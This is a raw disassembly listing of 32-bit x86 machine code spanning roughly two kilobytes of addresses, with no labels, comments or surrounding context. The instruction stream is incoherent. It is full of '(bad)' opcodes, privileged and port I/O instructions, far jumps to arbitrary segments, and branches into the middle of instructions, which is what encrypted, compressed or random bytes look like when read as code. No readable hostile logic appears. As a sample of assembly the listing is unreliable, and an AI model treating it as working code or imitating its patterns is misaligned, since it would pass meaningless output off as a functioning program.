  416299:	lahf   
  41629a:	jno    0x416294
  41629c:	(bad)  
  41629d:	mov    dh,0xee
  41629f:	(bad)  
  4162a0:	mov    dl,0x70
  4162a2:	dec    ebp
  4162a3:	leave  
  4162a4:	out    0xf8,eax
  4162a6:	sti    
  4162a7:	push   eax
  4162a8:	fwait
  4162a9:	ja     0x416323
  4162ab:	icebp  
  4162ac:	jge    0x4162d4
  4162ae:	push   es
  4162af:	jl     0x416300
  4162b1:	pop    ecx
  4162b2:	cmp    ebp,DWORD PTR fs:[edi+0x4a]
  4162b6:	jg     0x416280
  4162b8:	scas   al,BYTE PTR es:[edi]
  4162b9:	fnsave [edx-0xb9aa9a7]
  4162bf:	fst    QWORD PTR [ecx+0x2d]
  4162c2:	xor    edx,DWORD PTR [ebp+edi*1+0x12]
  4162c6:	jne    0x4162fb
  4162c8:	push   esp
  4162c9:	sub    BYTE PTR ds:[edi],bh
  4162cc:	push   edi
  4162cd:	popf   
  4162ce:	mov    BYTE PTR [esi+0x4f],al
  4162d1:	xchg   esp,eax
  4162d2:	mov    ds:0x35e0d3d2,al
  4162d7:	int3   
  4162d8:	pop    ds
  4162d9:	jg     0x416337
  4162db:	fscale 
  4162dd:	stc    
  4162de:	nop
  4162df:	inc    bx
  4162e1:	sub    al,0xf7
  4162e3:	jnp    0x416342
  4162e5:	scas   al,BYTE PTR es:[edi]
  4162e6:	jnp    0x4162c8
  4162e8:	in     eax,0xec
  4162ea:	add    bl,ch
  4162ec:	sub    eax,0x1d3d59cf
  4162f1:	jae    0x41633e
  4162f3:	shl    DWORD PTR [ecx+0x31],cl
  4162f6:	pop    esi
  4162f7:	cmp    ah,BYTE PTR [ecx-0x79da7196]
  4162fd:	cwde   
  4162fe:	into   
  4162ff:	int    0x20
  416301:	popa   
  416302:	rcl    bh,0x1e
  416305:	inc    ecx
  416306:	repnz repz lds esi,FWORD PTR [esp+ebx*2-0x5375635d]
  41630f:	hlt    
  416310:	sub    eax,0x53081881
  416315:	daa    
  416316:	xchg   edi,eax
  416317:	fcom   DWORD PTR ds:0xef919581
  41631d:	mov    ds:0x89a61c25,al
  416322:	in     al,dx
  416323:	add    edi,DWORD PTR fs:[eax-0x5903fa4a]
  41632a:	ret    0xe22e
  41632d:	sub    ebp,DWORD PTR [ebp-0x7c]
  416330:	dec    edx
  416331:	jb     0x416349
  416333:	jg     0x4162b6
  416335:	xor    edi,DWORD PTR [edx+0x3c6d5755]
  41633b:	fld    st(4)
  41633d:	mov    esp,0x15ebea94
  416342:	push   es
  416343:	add    ah,BYTE PTR [eax+0x343c9bc4]
  416349:	iret   
  41634a:	loopne 0x4163bc
  41634c:	push   es
  41634d:	mov    ah,ch
  41634f:	push   ds
  416350:	scas   al,BYTE PTR es:[edi]
  416351:	sub    dl,BYTE PTR [ebx+0x5047aabe]
  416357:	mov    eax,ds:0xc371ec9c
  41635c:	popf   
  41635d:	dec    esp
  41635e:	pop    ecx
  41635f:	int    0xad
  416361:	pop    esi
  416362:	mov    ds:0x8e48bddc,eax
  416367:	mov    ah,dl
  416369:	retf   
  41636a:	cmp    ebp,ebp
  41636c:	imul   edx,esi,0x12f69229
  416372:	lea    ebp,ds:[ebx+0x6e]
  416376:	jo     0x41638d
  416378:	clc    
  416379:	or     eax,0xa8be0152
  41637e:	fild   QWORD PTR [ecx+0x40]
  416381:	xchg   esp,eax
  416382:	inc    ebp
  416383:	shl    bl,0x6d
  416386:	aam    0xd9
  416388:	mov    esp,?
  41638a:	ds cld 
  41638c:	sar    DWORD PTR ds:0xc751f58f,0x65
  416393:	cli    
  416394:	cmp    BYTE PTR [edx-0x70819ff5],al
  41639a:	outs   dx,BYTE PTR ds:[esi]
  41639b:	mov    eax,0xcd07fc4c
  4163a0:	repnz pop edi
  4163a2:	push   ss
  4163a3:	mov    ch,0xb
  4163a5:	push   eax
  4163a6:	inc    esp
  4163a7:	xchg   dl,ah
  4163a9:	clc    
  4163aa:	sub    DWORD PTR [esi+0x5],ecx
  4163ad:	mov    gs,WORD PTR [eax-0x569fcf72]
  4163b3:	sub    DWORD PTR [edi],0xfffffff9
  4163b6:	sub    bl,BYTE PTR [edi-0x46a41b9]
  4163bc:	jns    0x4163be
  4163be:	out    dx,eax
  4163bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c0:	xchg   edi,eax
  4163c1:	rcl    ah,0x8e
  4163c4:	ins    BYTE PTR es:[edi],dx
  4163c5:	or     edx,DWORD PTR [esi]
  4163c7:	mov    ch,0x97
  4163c9:	fistp  WORD PTR [edx+ebx*1-0x6d]
  4163cd:	inc    edx
  4163cf:	(bad)  
  4163d0:	jle    0x4163db
  4163d2:	clc    
  4163d3:	jmp    0x4163a8
  4163d5:	push   ebp
  4163d6:	fnsave [edx+0x1c]
  4163d9:	push   esp
  4163da:	jge    0x41638e
  4163dc:	cmp    eax,0x26920338
  4163e1:	and    DWORD PTR [edi+0x46],0x79
  4163e5:	and    eax,0x38e7d794
  4163ea:	adc    ebp,eax
  4163ec:	inc    eax
  4163ed:	cdq    
  4163ee:	test   BYTE PTR [eax+0x5a],0x5f
  4163f2:	add    eax,DWORD PTR [esi+0x525b52c4]
  4163f8:	push   edx
  4163f9:	sub    dh,BYTE PTR [ecx+edx*4]
  4163fc:	shl    BYTE PTR [esi],cl
  4163fe:	retf   0x3a8c
  416401:	or     DWORD PTR [ecx+ebx*2+0x4629ad5c],edx
  416408:	xlat   BYTE PTR ds:[ebx]
  416409:	adc    eax,0x8f0158d4
  41640e:	mov    edi,esp
  416410:	fimul  DWORD PTR [edx+ebp*8-0x201ae464]
  416417:	pop    ebp
  416418:	pop    esi
  416419:	mul    BYTE PTR [eax-0x2f]
  41641c:	popf   
  41641d:	pop    edx
  41641e:	mov    eax,DWORD PTR [esp+eax*2]
  416421:	ins    DWORD PTR es:[edi],dx
  416422:	mov    ebp,0xdd63364f
  416427:	call   0xf8081c72
  41642c:	inc    esp
  41642d:	adc    DWORD PTR cs:[eax+eiz*4-0x1f],edi
  416432:	stos   BYTE PTR es:[edi],al
  416433:	sar    BYTE PTR cs:[ecx],1
  416436:	(bad)  
  416437:	dec    edi
  416438:	sub    esp,esi
  41643a:	xchg   esp,eax
  41643b:	and    edi,ebx
  41643d:	push   ss
  41643e:	fincstp 
  416440:	adc    BYTE PTR [eax],0x7b
  416443:	jge    0x41648d
  416445:	popa   
  416446:	test   al,0xb5
  416448:	dec    edi
  416449:	jle    0x41642a
  41644b:	(bad)  
  41644c:	dec    ebp
  41644d:	std    
  41644e:	and    ch,bl
  416450:	inc    esi
  416451:	test   al,0xa0
  416453:	jbe    0x4163d5
  416455:	retf   
  416456:	div    DWORD PTR [ebx+ecx*4+0x7f0ad93b]
  41645d:	aam    0x86
  41645f:	cld    
  416460:	aad    0x2d
  416462:	popf   
  416463:	mov    dl,0x5
  416465:	fiadd  WORD PTR [ebp-0x2601b48b]
  41646b:	std    
  41646c:	dec    ecx
  41646d:	add    dh,BYTE PTR [eax+0x3a204a0c]
  416473:	shl    cl,1
  416475:	and    ebx,DWORD PTR [esi-0x5f]
  416478:	std    
  416479:	retf   
  41647a:	xor    al,0x69
  41647c:	jo     0x416485
  41647e:	inc    eax
  41647f:	or     BYTE PTR [ebp-0x64],ah
  416482:	sub    eax,0xf515156d
  416487:	xchg   ebp,eax
  416488:	stos   DWORD PTR es:[edi],eax
  416489:	(bad)
  41648c:	nop
  41648d:	inc    eax
  41648e:	inc    ebp
  41648f:	xchg   ecx,eax
  416490:	cmp    DWORD PTR [ecx],ebp
  416492:	inc    edx
  416493:	out    0x88,eax
  416495:	dec    edx
  416496:	(bad)  
  416497:	fstp   st(6)
  416499:	enter  0xbac4,0x5a
  41649d:	mov    ds:0x8fa9ff9b,al
  4164a2:	push   eax
  4164a3:	cmp    bh,ch
  4164a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a6:	xlat   BYTE PTR ds:[ebx]
  4164a7:	mov    bl,0x7f
  4164a9:	bound  esi,QWORD PTR [edi+0x4ca47c86]
  4164af:	sbb    ebx,edi
  4164b1:	sbb    BYTE PTR [edi+0x50],dl
  4164b4:	std    
  4164b5:	outs   dx,BYTE PTR ds:[esi]
  4164b6:	add    ebx,DWORD PTR [eax]
  4164b8:	fucomip st,st(0)
  4164ba:	das    
  4164bb:	shr    DWORD PTR [esi+0x7b],1
  4164be:	sti    
  4164bf:	jmp    FWORD PTR [ebp-0x37]
  4164c2:	lds    ecx,FWORD PTR ds:[ebx+0x18e7d2b4]
  4164c9:	jo     0x41649b
  4164cb:	mov    eax,ss:0xf539a644
  4164d1:	mov    dh,0x52
  4164d3:	das    
  4164d4:	inc    esi
  4164d5:	call   0x47b6:0x65186538
  4164dc:	addr16 loope 0x416512
  4164df:	pushf  
  4164e0:	(bad)  
  4164e2:	add    DWORD PTR [eax],eax
  4164e4:	push   ebx
  4164e5:	inc    eax
  4164e6:	push   ds
  4164e7:	sbb    bl,cl
  4164e9:	test   esp,esp
  4164eb:	fistp  WORD PTR [ebx+edx*1]
  4164ee:	cmp    dl,dl
  4164f0:	inc    ecx
  4164f1:	add    al,0x69
  4164f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164f4:	arpl   WORD PTR es:[edx],dx
  4164f7:	add    DWORD PTR [ebx-0x23],eax
  4164fa:	in     eax,dx
  4164fb:	or     esp,DWORD PTR [ecx]
  4164fd:	jno    0x416570
  4164ff:	popf   
  416500:	add    ah,BYTE PTR [edi+0x487bdae4]
  416506:	or     BYTE PTR [eax+0x6],dl
  416509:	dec    eax
  41650a:	dec    esi
  41650b:	mov    dl,0x3a
  41650d:	xor    bl,BYTE PTR [esi-0x1ee75a45]
  416513:	fisub  WORD PTR ds:[ebx]
  416516:	cmp    BYTE PTR [edi+0x23f6c6d2],bl
  41651c:	fcom   DWORD PTR ds:0x9ce87e44
  416522:	imul   ebp,DWORD PTR [ecx+0x60],0xfffffff8
  416526:	mov    ah,0xa5
  416528:	mov    edx,0x4053fcdc
  41652d:	ins    DWORD PTR es:[edi],dx
  41652e:	jno    0x416583
  416530:	mov    cl,0x51
  416532:	retf   0xd24b
  416535:	fcomp  DWORD PTR [eax]
  416537:	lock or al,0xcb
  41653a:	add    eax,0x8ec04a65
  41653f:	pop    ecx
  416540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416541:	je     0x41652a
  416543:	and    edx,DWORD PTR [edi+0x6b]
  416546:	das    
  416547:	mov    esp,0xb239bc47
  41654c:	outs   dx,DWORD PTR ds:[esi]
  41654d:	not    DWORD PTR [esi-0x7ddcb79a]
  416553:	xchg   esi,eax
  416554:	sub    ebp,esi
  416556:	pop    esi
  416557:	jne    0x416545
  416559:	js     0x4164db
  41655b:	mov    edi,0x7a302546
  416560:	sbb    ah,BYTE PTR [edx]
  416562:	mov    bl,0x7d
  416564:	loop   0x416543
  416566:	cmc    
  416567:	sbb    DWORD PTR [ebx],ebp
  416569:	outs   dx,DWORD PTR ds:[esi]
  41656b:	in     al,dx
  41656c:	fdivp  st(5),st
  41656e:	jne    0x416526
  416570:	lahf   
  416571:	fsubr  QWORD PTR [ebx]
  416573:	sub    cl,BYTE PTR gs:[esi-0xe]
  416577:	inc    ebx
  416578:	xchg   ecx,eax
  416579:	jg     0x41657b
  41657b:	push   es
  41657c:	sub    ebp,ebp
  41657e:	aad    0x22
  416580:	test   ch,dh
  416582:	stc    
  416583:	push   edx
  416584:	popa   
  416585:	or     BYTE PTR [esi+0x56adcab4],bh
  41658b:	daa    
  41658c:	fld    QWORD PTR [edx]
  41658e:	je     0x416539
  416590:	and    dh,dl
  416592:	mov    ecx,0xf4f351e6
  416597:	sahf   
  416598:	or     ch,BYTE PTR [ebp+0xd3b9a83]
  41659e:	(bad)  
  41659f:	xchg   ecx,eax
  4165a0:	cmp    DWORD PTR [ebp+0x1071357a],ebx
  4165a6:	sub    al,BYTE PTR [ebp+0x552e9ea6]
  4165ac:	retf   
  4165ad:	push   DWORD PTR [edi]
  4165af:	pop    ebx
  4165b0:	xchg   ebx,eax
  4165b1:	push   ds
  4165b2:	jno    0x41658d
  4165b4:	jle    0x4165fd
  4165b6:	not    BYTE PTR [edi+0x48]
  4165b9:	cmp    bh,BYTE PTR ss:[ebx]
  4165bc:	nop
  4165bd:	fcomp  DWORD PTR [esi+0x4f]
  4165c0:	pop    ebx
  4165c1:	push   edx
  4165c2:	or     edx,esi
  4165c4:	(bad)  
  4165c5:	or     DWORD PTR [esi],ebx
  4165c7:	xchg   edx,eax
  4165c8:	xlat   BYTE PTR ds:[ebx]
  4165c9:	scas   al,BYTE PTR es:[edi]
  4165ca:	inc    esp
  4165cb:	mul    BYTE PTR [esp+eax*1-0x54]
  4165cf:	adc    cl,0xc6
  4165d2:	jns    0x4165a3
  4165d4:	sbb    al,BYTE PTR [edi+edx*2+0x6d]
  4165d8:	mov    eax,ds:0xfbebf61b
  4165dd:	ficom  WORD PTR [ebx-0x42]
  4165e0:	data16 and al,0xf5
  4165e3:	dec    edx
  4165e4:	jns    0x416661
  4165e6:	lods   eax,DWORD PTR ds:[esi]
  4165e7:	or     al,0x96
  4165e9:	enter  0xb75,0xcb
  4165ed:	jbe    0x416581
  4165ef:	(bad)  
  4165f0:	mov    al,0xdc
  4165f2:	gs mov ebx,0x1bf68047
  4165f8:	cmc    
  4165f9:	add    dh,al
  4165fb:	mov    esp,0x70670d3c
  416600:	mov    edx,DWORD PTR [eax-0x42]
  416603:	pop    ebx
  416604:	ret    0x5eb
  416607:	mov    bl,0x89
  416609:	add    BYTE PTR [edi],dl
  41660b:	stos   BYTE PTR es:[edi],al
  41660c:	pop    ds
  41660d:	jmp    0x416624
  41660f:	pop    ebp
  416610:	(bad)  
  416611:	xchg   edi,eax
  416612:	xchg   edi,eax
  416613:	push   ebx
  416614:	fcmove st,st(3)
  416616:	sbb    edi,ebp
  416618:	enter  0x5b3b,0xc9
  41661c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41661d:	xor    eax,0x5f1c204a
  416622:	xchg   esi,eax
  416623:	mov    al,0x24
  416625:	sub    eax,DWORD PTR [ebx]
  416627:	mov    ah,0xf2
  416629:	test   al,0x4a
  41662b:	mov    esi,0x9963f1f2
  416630:	xchg   edx,eax
  416631:	jbe    0x41662e
  416633:	jle    0x41663f
  416635:	cmp    dh,ah
  416637:	inc    ecx
  416638:	cld    
  416639:	enter  0x8fee,0x33
  41663d:	stos   DWORD PTR es:[edi],eax
  41663e:	je     0x4165e7
  416640:	stos   BYTE PTR es:[edi],al
  416641:	or     DWORD PTR [ecx-0x45535a94],0xa6e83ecb
  41664b:	jne    0x416633
  41664d:	outs   dx,DWORD PTR ds:[esi]
  41664e:	xor    DWORD PTR [ebx],esp
  416650:	adc    eax,0xf9c80520
  416655:	mov    dl,0x26
  416657:	sbb    cl,BYTE PTR [esi]
  416659:	sbb    ch,0x57
  41665c:	pushf  
  41665d:	and    DWORD PTR [eax-0x6d],esp
  416660:	mov    dl,BYTE PTR [esp+ebp*2-0x3386638c]
  416667:	jne    0x4165fb
  416669:	ss or  ch,dl
  41666c:	or     eax,0x477e5b2c
  416671:	repz push 0xffffffc9
  416674:	xchg   ebp,eax
  416675:	out    0x19,al
  416677:	cs aas 
  416679:	pop    es
  41667a:	clc    
  41667b:	pop    eax
  41667c:	loop   0x416628
  41667e:	xchg   edx,eax
  41667f:	or     cl,0x81
  416682:	rcl    BYTE PTR [ebx+0x46],1
  416685:	test   al,0xea
  416687:	mov    dh,0x38
  416689:	jle    0x4166da
  41668b:	ss sti 
  41668d:	pop    edx
  41668e:	cmp    bh,bh
  416690:	sbb    bh,BYTE PTR [edi]
  416692:	or     DWORD PTR [esi+0x8],0xffffffa5
  416696:	stos   BYTE PTR es:[edi],al
  416697:	cld    
  416698:	retf   0x5c3c
  41669b:	repz sbb eax,0xa391a5f2
  4166a1:	icebp  
  4166a2:	ror    BYTE PTR [esi],cl
  4166a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166a5:	mov    ecx,0x18f87752
  4166aa:	jb     0x416648
  4166ac:	stos   DWORD PTR es:[edi],eax
  4166ad:	js     0x416688
  4166af:	xchg   edx,esi
  4166b1:	mov    edi,0x71edcae3
  4166b6:	sub    dl,dh
  4166b8:	pop    es
  4166b9:	and    edx,edi
  4166bb:	xor    dh,BYTE PTR [eax-0x2c41898d]
  4166c1:	push   eax
  4166c2:	fisubr WORD PTR [ebx]
  4166c4:	fwait
  4166c5:	lods   al,BYTE PTR ds:[esi]
  4166c6:	jae    0x416660
  4166c8:	mov    eax,ds:0xc53453f4
  4166cd:	loop   0x4166dd
  4166cf:	scas   al,BYTE PTR es:[edi]
  4166d0:	adc    cl,BYTE PTR [edx]
  4166d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166d3:	cmp    eax,edi
  4166d5:	push   0x21cbdddf
  4166da:	jle    0x416714
  4166dc:	call   DWORD PTR [ecx-0x58]
  4166df:	mov    dl,0xfa
  4166e1:	mov    esp,0x95ddeffd
  4166e6:	addr16 call 0xdad0:0x2bedccf1
  4166ee:	fs mov ebx,0xcee3f998
  4166f4:	dec    edi
  4166f5:	outs   dx,BYTE PTR ds:[esi]
  4166f6:	retf   
  4166f7:	inc    eax
  4166f8:	push   0xe22ecb98
  4166fd:	test   edi,ecx
  4166ff:	cli    
  416700:	xor    al,0xc6
  416702:	mov    esp,0xa153666e
  416707:	sub    cl,BYTE PTR [edx+ebp*2+0x34]
  41670b:	mov    bh,0xab
  41670d:	mov    ebx,esi
  41670f:	and    DWORD PTR [ebx+0x7da7ceb0],ecx
  416715:	dec    eax
  416716:	sbb    ecx,DWORD PTR [esi-0x4db44a5c]
  41671c:	out    0x51,al
  41671e:	jle    0x41671b
  416720:	in     al,0xb7
  416722:	es pop edi
  416724:	push   0x41
  416726:	dec    edi
  416727:	dec    eax
  416728:	pop    edx
  416729:	jge    0x416775
  41672b:	dec    ebx
  41672c:	jbe    0x416718
  41672e:	dec    edx
  41672f:	es (bad) 
  416731:	jae    0x416769
  416733:	cmc    
  416734:	pushf  
  416735:	push   0xffffff90
  416737:	ds xor eax,0x7db13b16
  41673d:	inc    edx
  41673e:	xor    al,0x4e
  416740:	or     BYTE PTR [edi+ecx*2],dl
  416743:	cmp    al,0xb3
  416745:	inc    ebp
  416746:	arpl   WORD PTR es:[esi],sp
  416749:	xchg   ebx,eax
  41674a:	push   0x7d71819d
  41674f:	and    bl,BYTE PTR [esi-0x28]
  416752:	cmp    DWORD PTR [edx+esi*4+0x3b],ebx
  416756:	xor    ah,dh
  416758:	xchg   BYTE PTR [esp+ebx*2],ch
  41675b:	int3   
  41675c:	enter  0xf106,0xa
  416760:	rol    ecx,cl
  416762:	je     0x4167ae
  416764:	fnstcw WORD PTR [esi+0x335f64ca]
  41676a:	aam    0xaa
  41676c:	push   eax
  41676d:	push   0xfc5c198d
  416772:	add    ebx,DWORD PTR [ebp+0x521e1c5b]
  416778:	sbb    BYTE PTR [ecx],bh
  41677a:	rcl    DWORD PTR [edx+0x1d85fe4a],0x35
  416781:	xchg   edi,eax
  416782:	je     0x416704
  416784:	xchg   ecx,eax
  416785:	mov    eax,ecx
  416787:	ds pop ecx
  416789:	or     eax,0xce2adde
  41678e:	dec    esi
  41678f:	test   BYTE PTR [ebp-0x6931490],0x87
  416796:	stc    
  416797:	lahf   
  416798:	mov    edx,0x5392465d
  41679d:	sbb    BYTE PTR [edi-0x37],ah
  4167a0:	xchg   esi,eax
  4167a1:	enter  0xefe5,0xa2
  4167a5:	inc    esi
  4167a6:	(bad)  
  4167a7:	daa    
  4167a8:	mov    ch,0x31
  4167aa:	adc    ecx,ebp
  4167ac:	fcmovb st,st(5)
  4167ae:	add    eax,0x3f6ac7c1
  4167b3:	cld    
  4167b4:	push   cs
  4167b5:	popf   
  4167b6:	sbb    al,0xcd
  4167b8:	sbb    eax,0xa6199692
  4167bd:	leave  
  4167be:	and    eax,0xe8a4470
  4167c3:	push   es
  4167c4:	(bad)  
  4167c5:	aaa    
  4167c6:	xchg   ecx,eax
  4167c7:	jle    0x41677f
  4167c9:	and    BYTE PTR [ebx],0x31
  4167cc:	xor    BYTE PTR [eax],al
  4167ce:	fist   DWORD PTR [edx-0x42]
  4167d1:	daa    
  4167d2:	mov    esp,0xec15b883
  4167d7:	push   es
  4167d8:	pop    esp
  4167d9:	mov    ds:0x30a47b6c,eax
  4167de:	mov    ah,0x8
  4167e0:	push   0xffffffcb
  4167e2:	jecxz  0x41677e
  4167e4:	pop    ebx
  4167e5:	sub    eax,DWORD PTR [ebx+0x4c]
  4167e8:	iret   
  4167e9:	imul   eax,DWORD PTR [esi+0x18],0x8cf139dd
  4167f0:	scas   eax,DWORD PTR es:[edi]
  4167f1:	sbb    BYTE PTR [esi-0x6e],ah
  4167f4:	push   0xfd27a581
  4167f9:	out    0xf3,eax
  4167fb:	loop   0x4167cb
  4167fd:	sbb    BYTE PTR [edi],ah
  4167ff:	add    eax,0x1a8f9d78
  416804:	add    BYTE PTR [edx+edi*4+0x2085b5bb],dl
  41680b:	into   
  41680c:	mov    ch,0x1b
  41680e:	outs   dx,DWORD PTR ds:[esi]
  41680f:	sahf   
  416810:	lods   al,BYTE PTR ds:[esi]
  416811:	rcr    ch,0x2f
  416814:	lock test ch,ch
  416817:	sar    BYTE PTR [ebp+eax*4+0x3e4b0768],0xdf
  41681f:	loop   0x416814
  416821:	pop    edx
  416822:	scas   al,BYTE PTR es:[edi]
  416823:	mov    BYTE PTR ds:0x870ca58f,cl
  416829:	push   edi
  41682a:	and    BYTE PTR [ecx],dl
  41682c:	fcomi  st,st(5)
  41682e:	fstp   DWORD PTR [edi+ebp*4]
  416831:	jl     0x416847
  416833:	dec    eax
  416834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416835:	and    al,0x3c
  416837:	push   edx
  416838:	jmp    0x4c61:0x2398662f
  41683f:	sub    edx,DWORD PTR [ecx-0x6b]
  416842:	cmp    bh,bl
  416844:	pushf  
  416845:	push   ebp
  416846:	popf   
  416847:	icebp  
  416848:	add    eax,0x92716c68
  41684d:	sar    BYTE PTR ds:0xa7a262d,cl
  416853:	jge    0x4168a9
  416855:	sub    BYTE PTR [edi+0xb],ch
  416858:	cmp    BYTE PTR [edx-0x60],bl
  41685b:	pop    ss
  41685c:	adc    DWORD PTR gs:[edi+0x7400f3f4],esi
  416863:	lea    ebp,[edx+0x5f750907]
  416869:	ins    BYTE PTR es:[edi],dx
  41686a:	sbb    edi,DWORD PTR [esi+0x23004eca]
  416870:	xchg   ebp,eax
  416871:	popa   
  416872:	fstp   QWORD PTR [edi-0x1d]
  416875:	pop    ebp
  416876:	leave  
  416877:	or     eax,0xb9981d8e
  41687c:	es aam 0xd
  41687f:	jns    0x41680d
  416881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416882:	js     0x4168af
  416884:	or     edx,DWORD PTR [edx]
  416886:	leave  
  416887:	inc    edi
  416888:	(bad)  
  416889:	int3   
  41688a:	pusha  
  41688b:	rol    BYTE PTR [edx],0x78
  41688e:	inc    ecx
  41688f:	adc    eax,0x4a74ef71
  416894:	inc    eax
  416895:	retf   0x30ea
  416898:	adc    ebp,DWORD PTR [eax+0x859e6f3]
  41689e:	push   ebx
  41689f:	push   ss
  4168a0:	mov    DWORD PTR [ebx+0x31],esp
  4168a3:	std    
  4168a4:	inc    ebx
  4168a5:	mov    ds,WORD PTR [eax]
  4168a7:	mov    edx,0x5b4d9dc0
  4168ac:	ret    0xa96
  4168af:	sbb    DWORD PTR [edx+0x41],0xffffffa6
  4168b3:	loope  0x416931
  4168b5:	inc    esp
  4168b6:	or     eax,0x40730f2c
  4168bb:	ret    
  4168bc:	jle    0x41686f
  4168be:	cdq    
  4168bf:	std    
  4168c0:	pop    edx
  4168c1:	push   edx
  4168c2:	lea    ebx,[edx+0x47]
  4168c5:	and    DWORD PTR [eax],0xf3ecc375
  4168cb:	adc    ch,bh
  4168cd:	jmp    0xcfcf:0x8af04daa
  4168d4:	sub    ebx,DWORD PTR [ebp-0x71460abd]
  4168da:	inc    ebx
  4168db:	gs xchg edx,eax
  4168dd:	and    BYTE PTR [edx+0x7d0586e9],ch
  4168e3:	test   eax,0xf7fa483f
  4168e8:	test   BYTE PTR ds:0x7ce8dfcc,dl
  4168ee:	(bad)  
  4168ef:	lock popa 
  4168f1:	jno    0x41696c
  4168f3:	lock jecxz 0x416964
  4168f6:	cmc    
  4168f7:	push   ds
  4168f8:	sbb    DWORD PTR [ebp-0x72825fb9],ecx
  4168fe:	idiv   DWORD PTR [ebp+0xc]
  416901:	sar    DWORD PTR [edx],1
  416903:	ss mov al,0xb5
  416906:	mov    WORD PTR [ebp+0x65],fs
  416909:	int    0xf
  41690b:	jne    0x4168d0
  41690d:	xor    dl,al
  41690f:	jp     0x4168a5
  416911:	fcomip st,st(7)
  416913:	mov    esi,0x280dd415
  416918:	adc    cl,BYTE PTR [esi-0x52947c67]
  41691e:	into   
  41691f:	sbb    al,0x89
  416921:	paddusw mm5,QWORD PTR [edi-0x22f01865]
  416928:	cmp    eax,DWORD PTR [edi]
  41692a:	aam    0xa
  41692c:	xchg   edx,eax
  41692d:	in     eax,0x10
  41692f:	bound  ebx,QWORD PTR [ecx-0x4f]
  416932:	ins    BYTE PTR es:[edi],dx
  416933:	(bad)  
  416934:	(bad)  
  416936:	or     al,cl
  416938:	pop    ss
  416939:	jge    0x4168e6
  41693b:	call   0xfea1811a
  416940:	popf   
  416941:	lahf   
  416942:	aam    0x84
  416944:	sub    DWORD PTR [eax+ebp*2+0x23],0x5fd0b6ee
  41694c:	xchg   ebx,eax
  41694d:	(bad)  
  41694e:	icebp  
  41694f:	xchg   ebp,eax
  416950:	fld    DWORD PTR [edi+ebp*8-0x65]
  416954:	je     0x41693f
  416956:	dec    edi
  416957:	mov    eax,DWORD PTR [eax-0x1a]
  41695a:	ficom  DWORD PTR [edi-0x5a]
  41695d:	aam    0xf6
  41695f:	jge    0x416976
  416961:	stc    
  416962:	pop    eax
  416963:	pop    ebp
  416964:	idiv   BYTE PTR [esi]
  416966:	dec    edx
  416967:	xchg   edi,eax
  416968:	je     0x416951
  41696a:	sub    eax,0x7b49918d
  41696f:	mov    ds:0xf6d1b266,eax
  416974:	dec    eax
  416975:	cs mov dl,0xf
  416978:	jecxz  0x41696e
  41697a:	enter  0x96a9,0xe9
  41697e:	(bad)  
  41697f:	fdivr  DWORD PTR [edx*2+0xf493af8]
  416986:	ins    DWORD PTR es:[edi],dx
  416987:	lods   eax,DWORD PTR ds:[esi]
  416988:	iret   
  416989:	and    BYTE PTR ds:0x1d6a43a7,al
  41698f:	xor    al,0xe5
  416991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416992:	add    al,0x3e
  416994:	pusha  
  416995:	pop    esp
  416996:	enter  0x820b,0x23
  41699a:	adc    ebp,DWORD PTR [ebp+0x1a0ad909]
  4169a0:	sub    dl,BYTE PTR [esi+ebp*2-0xa]
  4169a4:	stos   BYTE PTR es:[edi],al
  4169a5:	fmul   DWORD PTR [ecx]
  4169a7:	push   0xfffffffc
  4169a9:	mov    ds:0x4700c617,al
  4169ae:	retf   0x9bee
  4169b1:	js     0x4169c6
  4169b3:	sub    eax,0x92748bf9
  4169b8:	test   eax,0x21b2409b
  4169bd:	inc    eax
  4169be:	add    al,BYTE PTR [edi-0x61]
  4169c1:	mov    cl,BYTE PTR [ecx-0x4c]
  4169c4:	mov    bl,0xfa
  4169c6:	adc    BYTE PTR [edx],bl
  4169c8:	call   0xd8079972
  4169cd:	call   0x350d:0x7731aa57
  4169d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d5:	ja     0x4169b8
  4169d7:	das    
  4169d8:	pop    edx
  4169d9:	mov    BYTE PTR [edi-0x20],al
  4169dc:	mov    esi,eax
  4169de:	int    0x64
  4169e0:	add    ah,BYTE PTR [edi-0x14]
  4169e3:	in     eax,dx
  4169e4:	push   ss
  4169e5:	std    
  4169e6:	jp     0x4169c9
  4169e8:	mov    bh,0x87
  4169ea:	pop    ebx
  4169eb:	arpl   si,dx
  4169ed:	retf   
  4169ee:	loope  0x416a45
  4169f0:	retf   0xcba1
  4169f3:	test   DWORD PTR [eax+0x37],esi
  4169f6:	popa   
  4169f7:	(bad)  
  4169f8:	sti    
  4169f9:	inc    ecx
  4169fa:	jo     0x4169de
  4169fc:	sub    DWORD PTR [edi+0x38],esp
  4169ff:	dec    ecx
  416a00:	sbb    BYTE PTR [edx+0x4b],dh
  416a03:	and    edi,edi
  416a05:	loope  0x41698c
  416a07:	(bad)  
  416a08:	ror    BYTE PTR [edi+edi*2],1
  416a0b:	adc    al,0x2d
  416a0d:	retf   
  416a0e:	(bad)  
  416a0f:	hlt    
  416a10:	test   ebx,ebp
  416a12:	jbe    0x416a79
  416a14:	cmp    al,0x1d
  416a16:	mov    ebp,0xdb3fb9b9
  416a1b:	push   0xb7409843
  416a20:	ficomp WORD PTR gs:[edx+0x4e]
  416a24:	shr    BYTE PTR [eax+ebx*1-0x3d],1
  416a28:	jle    0x4169e0
  416a2a:	push   ds
  416a2b:	js     0x416aa0
  416a2d:	and    eax,0xba5df829
  416a32:	xchg   ebp,ebp
  416a34:	in     eax,0xb6
  416a36:	pop    edi
  416a37:	mov    ebp,0xac20af6d
  416a3c:	adc    DWORD PTR [esi-0x59],edx
  416a3f:	vpaddw ymm1,ymm0,YMMWORD PTR [ebp+0x2f]
  416a44:	dec    eax
  416a45:	or     al,0xf1
  416a47:	test   BYTE PTR [esi],cl
  416a49:	mov    al,0xab
  416a4b:	aam    0xb8
